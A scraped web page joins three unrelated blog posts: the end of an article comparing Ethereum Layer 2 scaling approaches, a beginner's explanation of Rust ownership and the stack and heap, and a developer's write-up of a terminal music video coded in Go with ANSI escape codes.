<em>only</em> for specific applications that are Layer 2 aware and enabled without requiring <em>everyone</em> to upgrade the base layer infrastructure (which is a significant effort involving a lot of risk). While they don’t always offer the same level of security and finality guarantees as Layer 1, they could be sufficient enough for certain applications that require increased throughput, decreased costs and a better overall user experience than what Layer 1 offers currently.</p><p>The most promising Layer 2 solutions until recently were State Channels and Plasma.</p><p><strong>State Channels</strong> are typically best suited for applications where the number of participants is well defined, need to exchange many state updates over time and have strong availability guarantees to account for challenge periods. <a href="https://connext.network/">Connext Network</a> is a representative example of a project that is currently using State Channels to help scale DApps.</p><p><strong>Plasma</strong> was <a href="http://plasma.io/plasma.pdf">introduced</a> in August 2017 by Vitalik Buterin and Joseph Poon. It is a <a href="https://www.learnplasma.org/">framework</a> for scaling where assets are transferred into/out-of child chain(s) via a smart contract on the root chain, all transaction execution happens on child chain(s) with state commitments (via Merkle root created from all state updates in the block) posted to the root chain which may later be used in fraud proofs during exits to the root chain. There have been many variants of Plasma proposed including Minimum Viable Plasma, More Viable Plasma, Cash, Debit and Prime. OMG Network’s More Viable Plasma is a recent example of a Plasma project that has seen market adoption.</p><p><strong>Drawbacks:</strong> The biggest drawback of State Channels is its <em>liveness assumption</em> — users or their representatives need to be constantly monitoring Layer 1 to be available for any challenges. And Plasma not only inherits this liveness assumption but also has a <em>data availability <em>assumption — </em></em>users need to trust the operators to make available all the transaction data required to verify correctness if/when required. In the absence of that, they could exit the Plasma chain but that could lead to a mass exit problem in the worst-case scenario. Also, both State Channels and Plasma do not support smart contracts, in general, which severely limits applications that require EVM compatibility<em>.</em></p><figure><img src="https://lh5.googleusercontent.com/iFK6VIk2xTwYWkPRM4MeoRJqFQXfTBp2q98vcKxWhsuZCg5UJRax_hi0x7mebn0CdoOFKoiHe5nSq4Q3gj9_hzNzewFOcduT5Ivtq7feZd5ZZkpLRstIKYYMKMoUavENfySbQ16_" alt=""></figure><p>Looking at the comparative <a href="https://medium.com/matter-labs/evaluating-ethereum-l2-scaling-solutions-a-comparison-framework-b6b2f410f955">illustration</a> above, Rollups do not need to make the two described limiting assumptions that could be a deal breaker in many scenarios. This makes Rollups more promising than State Channels and Plasma for a wide variety of applications.</p><p>So let’s look at what Rollups are and why they do not have the limiting assumptions of State Channels and Plasma.</p><h2 id="rollups-what">Rollups: What?</h2><p>Rollups are very similar to Plasma with one big difference to avoid its data availability assumption — all Layer 2 transactions are “rolled up” into a block which is committed to Layer 1 in one transaction’s calldata (calldata is the read-only area where data parameters of an Ethereum transaction are held).</p><p>Given that calldata is much cheaper than Layer 1 storage, this approach allows Layer 2 transaction data — unlike only the Merkle root in Plasma — to be available on Layer 1 anytime someone needs it for validating a state transition. So Layer 2 data once committed is always available on Layer 1. This property removes the requirements of both liveness and data availability assumptions giving Rollups the edge over both State Channels and Plasma.</p><p>Depending on the approach to validating state transitions, there are two types of Rollups: ZK Rollups and Optimistic Rollups.</p><p><strong>ZK Rollups (ZkR)</strong>: In ZkR, operator(s) must generate a <a href="https://z.cash/technology/zksnarks/">zk-SNARK</a> validity proof for every state transition on Layer 2 and submit these to the Rollup contract on Layer 1 which verifies that there are valid proofs for state transitions to go from the old Merkle root to the new one. The guarantees here are cryptographic in nature, albeit using novel primitives.</p><p><strong>Optimistic Rollups (OR)</strong>: In OR, operator(s) submit the new Merkle root along with transaction data to the Rollup contract on Layer 1 and everyone optimistically moves forward with the assumption that this is a valid transition (without verifying like in ZkR) but if not, one of the participants will challenge it with a fraud proof. The guarantees here are cryptoeconomic in nature because operators are incentivized to be honest with token rewards along with staking and slashing.</p><p>To summarize from a <a href="https://medium.com/matter-labs/optimistic-vs-zk-rollup-deep-dive-ea141e71e075">deep-dive</a> comparative analysis, ZkRs today are best suited for token transfers with faster time-to-finality (~1-20 minutes) but do not support EVM-compatible smart contracts for generalized applications. In contrast, ORs today are best suited for applications requiring EVM-compatible smart contract support but with the downside of slower time-to-finality (~1-2 weeks) by default to account for the fraud proof challenge window. (There are however techniques to provide economic guarantees for achieving faster finality or withdrawal times with ORs.)</p><h2 id="rollups-who">Rollups: Who?</h2><p>There are multiple projects working on ZkR and OR implementations with different assumptions and properties suitable for different scenarios.</p><p><strong>ZkR</strong>: <a href="https://zksync.io/">zkSync</a> from Matter Labs is live on Ethereum mainnet. Loopring has <a href="https://blogs.loopring.org/loopring-pay-is-live-zkrollup-transfers-on-ethereum/">launched</a> a DEX and payments using ZkR. <a href="https://medium.com/starkware/with-starkex-ethereum-is-ready-for-reddit-3b2966d5203b">StarkEx</a> from StarkWare is a ZkR technology that uses <a href="https://docs.ethhub.io/ethereum-roadmap/layer-2-scaling/zk-starks/">zk-STARK</a> (instead of zk-SNARK) and therefore is not dependent on a trusted setup, more scalable and currently quantum resistant.</p><p><strong>OR</strong>: There are at least nine projects working on different variations of OR as shown in the below comparison table from this <a href="https://medium.com/molochdao/the-state-of-optimistic-rollup-8ade537a2d0f">article</a>. The biggest differentiators are support for EVM compatibility and the interactivity requirements of challenges with fraud proofs. For example, <a href="https://blog.celer.network/2020/07/20/introducing-the-celer-hybrid-rollup-testnet/">Celer</a>, <a href="https://nutberry.github.io/">Nutberry</a> and <a href="https://optimism.io/">Optimism</a> support EVM-compatible smart contracts with single-round fraud proofs.</p><figure><img src="https://lh5.googleusercontent.com/bHAtV-TfsdLmZO5xfcXeViZLo0sd8TWlKUsx82qmkYuUF6RC0D8ezzViIav2Re1XoSJqWKCXKf5jtK5BQDxThOrkRjPU8SglEr_BpPonOv-b0asmcRMwiypiR_oVVeaVFpWlp1nH" alt=""></figure><h2 id="status-network">Status Network</h2><p>A big part of the vision at Status is being the “Window onto Ethereum.” While <a href="https://status.im/">Status Messenger</a> does not interface directly with the Ethereum blockchain, the app bundles a secure crypto wallet and web3 browser which interact with Ethereum and therefore are directly affected by the soaring gas prices due to the aforementioned scalability challenges. </p><p>The <a href="https://keycard.tech/">Keycard</a> product which is part of <a href="https://statusnetwork.com/">Status Network</a> is exploring a <a href="https://discuss.status.im/t/keycard-for-payments-proof-of-concept-and-a-demo/1590">payments network</a> whose design requirements of credit-card level scalability and near-instant finality are not fulfilled by the Ethereum network today.</p><p>Additionally, there are numerous other initiatives within Status Network such as <a href="https://discuss.status.im/t/kudos-rewards-building-the-status-meritocracy/1019">Kudos rewards</a>, <a href="https://github.com/status-im/tribute-to-talk/blob/master/docs/TributeToTalk.md">Tribu…</a></p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><a href="https://www.thomascountz.com/2018/07/11/ownership-in-rust-part-2"><em>Ownership in Rust, Part 2</em> →</a></p><p>As a Rubyist, all that I know about memory allocation is that it’s handled by some process called garbage collection and that it’s <a href="https://medium.com/u/64e4f5eee153">Aaron Patterson</a>’s problem, not mine.</p><p>So, when I cracked open the <a href="https://doc.rust-lang.org/book/second-edition/">Rust Book</a> and saw that one of Rust’s defining features is its alternative to garbage collection, I became a bit worried.</p><p>Was the responsibility of dealing with memory management about to be heaped onto me?</p><p>Apparently, with other system programming languages, like C, dealing with memory allocation is a big deal, and can have significant consequences when done poorly.</p><p>With all of the other new things to learn, I felt things beginning to stack up.</p><p>No, its not a hipster clothing brand, the stack and heap are ways of managing memory at runtime.</p><p><img src="https://www.thomascountz.com/assets/images/stack_and_heap.png" alt="Stack &amp; Heap"></p><p>First, we have the <strong>stack</strong>. The stack is considered fast because it stores and accesses data based on <em>order</em>. The last thing that was placed — pushed — onto* *the stack is the first thing removed — popped — from the stack. This is referred to as *LIFO, *Last In First Out, and means that we only need to keep track of where the top of the stack is when it comes time to free up memory.</p><p>The stack can also be fast because the amount of space needed from the stack is known at <em>compile</em> time. This means that we can allocate a fix-size portion of memory before we store anything into it.</p><p>For example, if you know that four people are coming to your dinner party, you can decide ahead of time where everyone will sit, how much food to prepare, and practice their names before they get there. This is super efficient!</p><p>Next, we have the alternative, the <strong>heap</strong>. When you don’t know exactly how many people are coming to your dinner party ahead of time, you can use the heap. Using the heap means finding extra chairs and giving out name tags as more and more people arrive to your dinner party.</p><p>When data of unknown-size needs to be stored during runtime, the computer searches for memory on the heap, marks it, and returns a <em>pointer</em>, which points back to that place in memory. This is called <em>allocating</em>. You can then push this pointer onto a stack, however, when you want to retrieve the actual data, you need to follow the pointer back to the heap.</p><hr><p>As I keep digging into the stack &amp; heap rabbit hole, it seems like managing data in the heap can be difficult. For example, you need to ensure that you allow the computer to reallocate a place in memory once you’re done using it. But if one part of your code <em>frees</em> a place in memory that another part of your code still has a pointer to, funky things can happen.</p><blockquote><p>Keeping track of what parts of code are using what data on the heap, minimizing the amount of duplicate data on the heap, and cleaning up unused data on the heap so you don’t run out of space are all problems that ownership addresses.</p></blockquote><blockquote><ul><li><a href="https://doc.rust-lang.org/book/second-edition/">Rust Book</a></li></ul></blockquote><p><img src="https://www.thomascountz.com/assets/images/ownership.png" alt="Ownership"></p><p>There are three rules about ownership in Rust:</p><div><div><pre><code>Each value in Rust has a variable that’s called its *owner*.

There can only be one owner at a time.

When the owner goes out of scope, the value will be dropped.
</code></pre></div></div><p>The simplest illustration of this ownership magic is with variable scope:</p><div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>let</span> <span>hello</span> <span>=</span> <span>"Hello, World!"</span><span>;</span>
  <span>println</span><span>(</span><span>"{}"</span><span>,</span> <span>hello</span><span>);</span>
<span>}</span> <span>// variable `hello` is now invalid</span>
</code></pre></div></div><p>Once the current function scope is over, denoted by the <code>}</code>, the variable <code>hello</code> goes out of scope, and is <em>dropped</em>.</p><p>“Well, duh!” That’s what I thought when I first read this. This is the same in most other programming languages. This is what I know as the behavior of a “locally-scoped variable.”</p><p>If this is all ownership does, I’m not sure what all the hubbub is about.</p><p>However, things get more interesting when we start passing around values and switching from using a string literal, which is stored on the stack, to using a <code>String</code> type, which is stored on the heap.</p><div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>let</span> <span>hello</span> <span>=</span> <span>"Hello, World!"</span><span>;</span> <span>// string literal</span>
  <span>let</span> <span>hello1</span> <span>=</span> <span>hello</span><span>;</span> <span>// copy the value of `hello` and bind it to `hello1`</span>
  <span>println</span><span>(</span><span>"{}"</span><span>,</span> <span>hello</span><span>);</span> <span>// this works!</span>
  
  <span>let</span> <span>hello</span> <span>=</span> <span>String</span><span>::</span><span>from</span><span>(</span><span>"Hello, World!"</span><span>);</span> <span>// `String` type</span>
  <span>let</span> <span>hello1</span> <span>=</span> <span>hello</span><span>;</span> <span>// move the data of `hello` into `hello1`</span>
  <span>println</span><span>(</span><span>"{}"</span><span>,</span> <span>hello</span><span>);</span> <span>// error[E0382]: use of moved value: `hello`</span>
<span>}</span>
</code></pre></div></div><p>We can see here, that when using a string literal, Rust is <em>copying</em> the value of <code>hello</code> into <code>hello1</code>, as we might expect. But when using a <code>String</code> type, Rust <em>moves</em> the value instead. Rust tells us that we attempted to retrieve a valued that has been moved by throwing the error:<code>error[E0382]: use of moved value: 'hello’</code></p><p>It seems like when using a string literal, Rust will <em>copy</em> the value of that one variable into another variable, but when we use a <code>String</code> type, it <em>moves</em> the value instead.</p><p>In order to find out which types implement the <em>copy trait</em> “…you can check the documentation… but as a general rule, any group of simple scalar values can be <code>Copy</code>, and nothing that requires allocation or is some form of resource is <code>Copy</code>”</p><h4 id="why-not-copy-everything">Why Not Copy Everything?</h4><p><em>Updated June 13, 2018</em></p><p><em>For the related discussion which lead to this update, please visit this <a href="https://users.rust-lang.org/t/the-copy-trait-what-does-it-actually-copy/18730/24">Rust language forum thread</a>.</em></p><p><img src="https://www.thomascountz.com/assets/images/copy_trait_when_using_str.png" alt="Copy trait when using &amp;str"></p><p>The string literal, <code>"Hello, World!"</code>, is stored somewhere in read-only memory, <em>(neither in the stack nor heap)</em>, and a pointer to that string is stored on the stack. Because it’s a string literal, it usually shows up as a <em>reference</em>, meaning that we use a pointer to a string stored in permanent memory, <em>(see <a href="https://medium.com/@thomascountz/ownership-in-rust-part-2-c3e1da89956e">Ownership in Rust, Part 2</a> for more on references)</em>, and it’s guaranteed to be valid for the duration of the entire program, (it has a <em>static lifetime)</em>.</p><p>Here, the pointers stored in <code>hello</code> and <code>hello1</code> are using the stack. When we use the <code>=</code> operator, Rust pushes a new copy of the pointer stored in <code>hello</code> onto the stack, and binds it to <code>hello1</code>. At the end of the scope, Rust adds a call to <code>[drop](https://doc.rust-lang.org/1.6.0/std/ops/trait.Drop.html)</code> which pops the values from the stack in order to free up memory. These pointers can be stored and easily copied to the stack because their size is known at compile-time.</p><p><img src="https://www.thomascountz.com/assets/images/move_trait_when_using_the_heap.png" alt="Move trait when using the heap"></p><p>Over on the heap, the <code>String</code> type with value <code>"Hello, World!"</code> is bound to the variable <code>hello</code> , using the <code>String::from</code> method. However, unlike the string literal, there’s more data bound to <code>hello</code> than just a pointer, and the size of this data can change during runtime. Here, the <code>=</code> operator binds the data from <code>hello</code> to a new variable <code>hello1</code>, effectively *moving *the data from one variable to another. Poor <code>hello</code> is now invalid, as per ownership rule #2: “There can only be one owner at a time.”</p><p>But why do this? Why doesn’t Rust always just make a copy of the data and bind it to the new variable?</p><p>If we think back to the differences between the stack and heap, we remember that the size of data stored on the heap is not known at compile time, which means we need to run through some memory allocation steps during runtime. This can be expensive. Depending on how much data we’re storing, we could quickly run out of memory if we sit around making copies of data all day.</p><p>Besides that, the default behavior of Rust helps protect us from memory issues that we might run into in other languages.</p><p>Part of storing data on the heap, is store a pointer to that data on the stack. However, unlike using a pointer to locate read-only memory, <em>like when using a string literal</em>, the data at the end of the pointer that leads to the heap, can change. A pointer is part of the <code>&lt;&lt;DATA&gt;&gt;</code> that is bound to the <code>hello</code> variable that stores the <code>String</code> type. If we bind the same pointer data to two different variables, it might look something like this:</p><p><img src="https://www.thomascountz.com/assets/images/rough_sketch_of_copying_string_type_data.png" alt="A rough sketch of copying String type data"></p><p>We have two variables, <code>hello</code> and <code>hello1</code>, which share ownership of the same value. This violates rule #2: “There can only be one owner at a time,” but let’s keep going.</p><p>At the end of the scope in which <code>hello</code> and <code>hello1</code> are defined, we have to <em>drop</em> the memory in the heap, which frees it up to be used again elsewhere.</p><p><img src="https://www.thomascountz.com/assets/images/dropping_hello1.png" alt="Dropping hello1"></p><p>First, we call <code>drop</code> on the data stored at the end of the pointer bound to <code>hello1</code>, but what happens now when we call <code>drop</code> on <code>hello</code>, next?</p><p><img src="https://www.thomascountz.com/assets/images/double_free_error.png" alt="Double Free Error"></p><p>This is called a <em>double free error</em>, which I think is best summarized in this <a href="https://stackoverflow.com/a/21057524">Stack Overflow answer</a>:</p><blockquote><p>A double free in C, technically speaking, leads to <em>undefined behavior</em>. This means that the program can behave completely arbitrarily and all bets are off about what happens. That’s certainly a bad thing to have happen! In practice, double-freeing a block of memory will corrupt the state of the memory manager, which might cause existing blocks of memory to get corrupted or for future allocations to fail in bizarre ways (for example, the same memory getting handed out on two different successive calls of <code>malloc</code>).</p></blockquote><blockquote><p>Double frees can happen in all sorts of cases. A fairly common one is when multiple different objects all have pointers to one another and start getting cleaned up by calls to <code>free</code>. When this happens, if you aren’t careful, you might <code>free</code> the same pointer multiple times when cleaning up the objects. There are lots of other cases as well, though.</p></blockquote><blockquote><p>—<a href="https://stackoverflow.com/users/501557/templatetypedef"> templatetypedef</a></p></blockquote><p>This is what Rust is trying to prevent! By invalidating <code>hello</code>, the compiler knows to only make a call to <code>drop</code>, (which calls <code>free</code> behind the scenes), on <code>hello1</code>.</p><hr><p>This is all well and good, but there are instances when we <em>do</em> want to copy data that’s stored in the heap. Rust provides an easy way of doing that with <code>clone()</code>.</p><div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>let</span> <span>hello</span> <span>=</span> <span>String</span><span>::</span><span>from</span><span>(</span><span>"Hello, World!"</span><span>);</span> <span>// `String` type</span>
  <span>let</span> <span>hello1</span> <span>=</span> <span>hello</span><span>.clone</span><span>();</span> <span>// clone data from `hello` into `hello1`</span>
  <span>println</span><span>(</span><span>"{}"</span><span>,</span> <span>hello</span><span>);</span> <span>// =&gt; "Hello, World!"</span>
<span>}</span>
</code></pre></div></div><p>Keep in mind that calls to <code>clone()</code> can be expensive, which is why Rust prevents this “deep copying” by default.</p><hr><p>Apparently, there’s a lot more about Rust ownership than covered here; there are concepts called <em>borrowing, referencing</em>, and <em>slicing</em>, too!</p><p>So far, it seems like learning about ownership is more to do with navigating Rust’s memory management solution than it is to learn about the problem it solves. But, instead of taking it as a quirk of the language, the <a href="https://doc.rust-lang.org/book/second-edition/">Rust Book</a> encourages you to learn about why the language writers were eager create a safer language.</p><p><a href="https://www.thomascountz.com/2018/07/11/ownership-in-rust-part-2">Read <em>Ownership in Rust, Part 2</em> →</a></p></section></div>

    <p>TL;DR: My band <a href="https://fb.com/enaehq" target="_blank">ENAE</a> has released a first single, called <a href="https://www.youtube.com/watch?v=-_-2EpUqb9g" target="_blank">The System</a>. Song is 100% DIY (from writing to recording to mixing to producing to releasing) and the music video is written 100% in Go!</p>

<h2 id="intro">Intro</h2>

<p>I always had a soft spot for interesting movies. Of course, I like the good story as much as the next guy, but the visual aspect can make me fall in love with a movie. I won’t even count how many times I’ve watched Guy Richie’s Sherlock Holmes (both movies actually), What We Do In The Shadows, Blade Runner or anything by Quentin Tarantino.</p>

<p>One thing that glues all of these movies together is that they do something really fresh from the very beginning - apart of the great story, they push the limit of visual aspect.</p>

<p>And I wanted to do the same with first <a href="https://fb.com/enaehq" target="_blank">ENAE</a> single. I’m a DIY guy and the visual aspect of things isn’t my strongest suit so, being a dev, what can I do?</p>

<p>Well, I can program the nerdiest music video you have seen so far.</p>


<h2 id="why-would-you-program-a-music-video">Why would you program a music video?</h2>

<p>Because I can.</p>

<p>No, really, this is the major thing why I’ve done it. I’ve thought that going nerdy and seeing how far I can push my knowledge about some stuff will be a fun project. Also I needed an excuse to brush off my sight reading and music transcription skills!</p>

<p>Before we go any further, I recommend watching <a href="https://www.youtube.com/watch?v=-_-2EpUqb9g" target="_blank">The Video</a>. so we’ll set the playing field - I’ll refer to it a few times!</p>

<p><a href="#top">Go to Top</a></p>


<h2 id="where-to-start">Where to start?</h2>

<p>There’s three parts to getting the song ready to be programmed:</p>

<ul>
  <li>First, sheet notation of your song. Helps with the timings and you don’t have to do the math yourself;</li>
  <li>Second, lyrics. Basically, what I’ve made is a more complicated lyrics video;</li>
  <li>Third, final mix version. As the timings might change, you don’t want to redo the whole video because your mix has changed.</li>
</ul>

<p>I’ve started mocking the video a long before we’ve finished the final mix, but I’ve started actual programming literally the day we’ve agreed on the mix.</p>

<p><a href="#top">Go to Top</a></p>


<h2 id="getting-the-sound">Getting the sound</h2>

<p>Getting the sound was actually the easiest bit - I’ve used <a href="https://github.com/faiface/beep" target="_blank">Beep by Faiface</a> in it’s most raw form:</p>

<p><code>done</code> is the channel I use to notify the main goroutine that play/print has finished. As it’s a music video, high-quality mp3 file is sufficient enough to be lightweight and good sounding.</p>

<p><a href="#top">Go to Top</a></p>


<h2 id="getting-the-first-characters-to-print">Getting the first characters to print</h2>

<p>The main file, that deals with all the things to print is, unsurprisingly, <code>printer.go</code>. Let’s break it down:</p>

<div><div><pre><code><span>var</span> <span>(</span>
  <span>// notes</span>
  <span>fullnote</span>         <span>int</span> <span>=</span> <span>1678</span>
  <span>halfnote</span>         <span>int</span> <span>=</span> <span>839</span>
  <span>quaternote</span>       <span>int</span> <span>=</span> <span>420</span>
  <span>eightnote</span>        <span>int</span> <span>=</span> <span>210</span>
  <span>sixteenthnote</span>    <span>int</span> <span>=</span> <span>105</span>
  <span>thirtysecondnote</span> <span>int</span> <span>=</span> <span>52</span>
  <span>sixtyfourthnote</span>  <span>int</span> <span>=</span> <span>26</span>
<span>)</span>
</code></pre></div></div>

<p>In order to be able to print stuff properly, you need to get a tempo of the song and the duration of each note in milliseconds. The formula to do that is really simple:</p>

<blockquote>
  <p>60000 / BPM = one beat in millisecond</p>
</blockquote>

<p>BPM (Beats per minute) is the song tempo, one beat refers to a quater note. So, in case of <em>The System</em>, where the BPM is 143, it’s:</p>

<blockquote>
  <p>60000 / 143 = 420 (rounded up)</p>
</blockquote>

<p>This way, I’ve calculated all necessary note durations that I’ll need to print.</p>

<p>Moving on:</p>

<div><div><pre><code><span>type</span> <span>Sized</span> <span>struct</span> <span>{</span>
  <span>width</span>  <span>int</span>
  <span>height</span> <span>int</span>

<span>func</span> <span>printer</span><span>(</span><span>done</span> <span>chan</span> <span>bool</span><span>)</span> <span>{</span>

  <span>s</span><span>.</span><span>lastChorus</span><span>()</span>
  <span>&lt;-</span><span>done</span>
<span>}</span>
</code></pre></div></div>

<p>We’ll touch on <code>Sized</code> struct a while later; for now, you can see how the song was built.</p>

<p>I’ve divided the chorus into 4 small chunks (in case I want to change only a part of it). <code>verse1</code> and <code>verse2</code> are a tiny bit different in the approach - one is typewriting (printing one character per x milliseconds), second one is Star-Wars-esque “Text is going up” using frames.</p>

<p>Before we go into the rhythm part of the music video, there are three very important functions in <code>printer.go</code>:</p>

<div><div><pre><code><span>func</span> <span>cleanDisplay</span><span>()</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>\x1b</span><span>[2J"</span><span>)</span>
  <span>moveCursor</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>)</span>
<span>}</span>

<span>func</span> <span>moveCursor</span><span>(</span><span>row</span><span>,</span> <span>col</span> <span>int</span><span>)</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>\x1b</span><span>[%d;%df"</span><span>,</span> <span>row</span><span>+</span><span>1</span><span>,</span> <span>col</span><span>+</span><span>1</span><span>)</span>
<span>}</span>

<span>func</span> <span>noteRest</span><span>(</span><span>note</span> <span>int</span><span>)</span> <span>{</span>
  <span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Millisecond</span> <span>*</span> <span>time</span><span>.</span><span>Duration</span><span>(</span><span>note</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>Here we delve into the nitty-gritty of the whole system - <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">Ansi escape codes</a>. In case of my music video, I’ve used a few:</p>

<p>in <code>printer.go</code>:</p>

<ul>
  <li><code>\x1b[2J</code> - all escape codes starts with <code>\x1b</code>, which is ASCII representation of ESC. <code>[2J</code> means to clear the whole display;</li>
  <li><code>\x1b[%d;%df</code> - <code>[%d;%df</code> moves the cursor to a given position</li>
</ul>

<blockquote>
  <p>We’ll talk about noteRest in a second!</p>
</blockquote>

<p>in <code>colours.go</code>:</p>

<p>(First, let’s bring the functions here)</p>

<div><div><pre><code><span>func</span> <span>resetColourChanges</span><span>()</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Print</span><span>(</span><span>"</span><span>\x1b</span><span>[0m"</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>as the function name says, it reset colour changes to default;</p>

<div><div><pre><code><span>func</span> <span>colourText</span><span>(</span><span>colour</span> <span>int</span><span>,</span> <span>bright</span> <span>bool</span><span>)</span> <span>{</span>
  <span>if</span> <span>bright</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>\x1b</span><span>[9%vm"</span><span>,</span> <span>colour</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>\x1b</span><span>[3%vm"</span><span>,</span> <span>colour</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p><code>colourText</code> is a wrapper around printing from basic palette of 8 colours (black, red, green, yellow, blue, magenta, cyan and white) in bright (<code>[9</code>) variant or in normal - let’s call it plain (<code>[3</code>);</p>

<div><div><pre><code><span>func</span> <span>colourTextRGB</span><span>(</span><span>red</span><span>,</span> <span>green</span><span>,</span> <span>blue</span> <span>int</span><span>)</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>\x1b</span><span>[38;2;%v;%v;%vm"</span><span>,</span> <span>red</span><span>,</span> <span>green</span><span>,</span> <span>blue</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>This is the function I ended up using - I’ve found a way to print the colours using RGB values - the loading bar you see before the solo starts is done using this magical thing!</p>

<p><a href="#top">Go to Top</a></p>


<h2 id="rhythm">Rhythm</h2>

<p>Remember <code>noteRest</code>? It’s nothing else than a wrapper around <code>time.Sleep</code>. To print time-based frames, I used <code>printInMicroseconds</code>:</p>

<div><div><pre><code><span>func</span> <span>printInMicroseconds</span><span>(</span><span>s</span> <span>string</span><span>,</span> <span>spd</span> <span>int</span><span>)</span> <span>{</span>
  <span>speed</span> <span>:=</span> <span>spd</span> <span>*</span> <span>1000</span>
  <span>freq</span> <span>:=</span> <span>(</span><span>float64</span><span>(</span><span>speed</span><span>)</span> <span>/</span> <span>float64</span><span>(</span><span>len</span><span>(</span><span>s</span><span>)))</span>
  <span>for</span> <span>i</span> <span>:=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>len</span><span>(</span><span>s</span><span>);</span> <span>i</span><span>++</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"%v"</span><span>,</span> <span>string</span><span>(</span><span>s</span><span>[</span><span>i</span><span>]))</span>
    <span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Microsecond</span> <span>*</span> <span>time</span><span>.</span><span>Duration</span><span>(</span><span>freq</span><span>))</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Why <em>Microseconds</em> instead of <em>Milliseconds</em> you ask? The reason for that is sometimes the lyrics aren’t really divisible by the millisecond duration of the note in a nice fashion. That’s why, I’m converting milliseconds to microseconds and then printing. Check <code>verse1.go</code>:</p>

<div><div><pre><code><span>...</span>
<span>func</span> <span>verse1</span><span>()</span> <span>{</span>
  <span>printInMicroseconds</span><span>(</span><span>verse1_1_1</span><span>,</span> <span>halfnote</span><span>+</span><span>quaternote</span><span>)</span> <span>// 3/1</span>
  <span>printInMicroseconds</span><span>(</span><span>verse1_1_2</span><span>,</span> <span>quaternote</span><span>)</span>          <span>// 1/1</span>
<span>...</span>
<span>}</span>
</code></pre></div></div>

<p>Sometimes some part of the lyrics will have to stay longer than pre-defined note duration. Because notes in the code are <code>int</code>, we can add them and then the function takes care of it!</p>

<p><a href="#top">Go to Top</a></p>

<p>And now,</p>


<h2 id="binary-solo">Binary solo</h2>

<p>This is the part, I think, I’m most proud of. The function:</p>

<div><div><pre><code><span>func</span> <span>(</span><span>s</span> <span>*</span><span>Sized</span><span>)</span> <span>printNoteInBinary</span><span>(</span><span>note</span> <span>string</span><span>,</span> <span>speed</span> <span>int</span><span>)</span> <span>{</span>

  <span>for</span> <span>_</span><span>,</span> <span>c</span> <span>:=</span> <span>range</span> <span>note</span> <span>{</span>
    <span>toBinary</span> <span>+=</span> <span>fmt</span><span>.</span><span>Sprintf</span><span>(</span><span>"%b "</span><span>,</span> <span>c</span><span>)</span>
  <span>}</span>
  <span>freq</span> <span>:=</span> <span>(</span><span>float64</span><span>(</span><span>speed</span><span>)</span> <span>/</span> <span>float64</span><span>(</span><span>len</span><span>(</span><span>toBinary</span><span>)))</span> <span>// to microseconds</span>
  <span>for</span> <span>_</span><span>,</span> <span>b</span> <span>:=</span> <span>range</span> <span>toBinary</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"%c"</span><span>,</span> <span>b</span><span>)</span>
    <span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Millisecond</span> <span>*</span> <span>time</span><span>.</span><span>Duration</span><span>(</span><span>freq</span><span>))</span>
  <span>}</span>
  <span>fmt</span><span>.</span><span>Println</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>The function itself is nothing crazy, but the approach to printing is:</p>

<div><div><pre><code><span>...</span>
<span>// 1st bar</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"D"</span><span>,</span> <span>fullnote</span><span>)</span>

<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"G"</span><span>,</span> <span>halfnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"A"</span><span>,</span> <span>halfnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"C"</span><span>,</span> <span>fullnote</span><span>)</span>
<span>cleanDisplay</span><span>()</span>
<span>// 2nd bar</span>
<span>noteRest</span><span>(</span><span>eightnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"A"</span><span>,</span> <span>sixteenthnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"C"</span><span>,</span> <span>sixteenthnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"D"</span><span>,</span> <span>eightnote</span><span>)</span>
<span>s</span><span>.</span><span>printNoteInBinary</span><span>(</span><span>"G"</span><span>,</span> <span>quaternote</span><span>)</span>
<span>...</span>
</code></pre></div></div>

<p>Remember at the beginning, I’ve told that we’d need a sheet music? Without that, programming this solo would be extremely painful. Each note gets converted to a binary representation and then gets printed within the note duration.</p>

<blockquote>
  <p>You might notice, that there’s a pointer to <code>Sized</code> here - reason for that is, I’ve iterated over multiple versions of the solo and thought the one now is the best looking one. In case someone would like to print it anywhere else on the screen, they can, because they know the terminal size already!</p>
</blockquote>

<p><a href="#top">Go to Top</a></p>


<h2 id="last-scene">Last scene</h2>

<p>The last scene is an interesting one, because there’s a very small chance that it’ll look the same ever.</p>

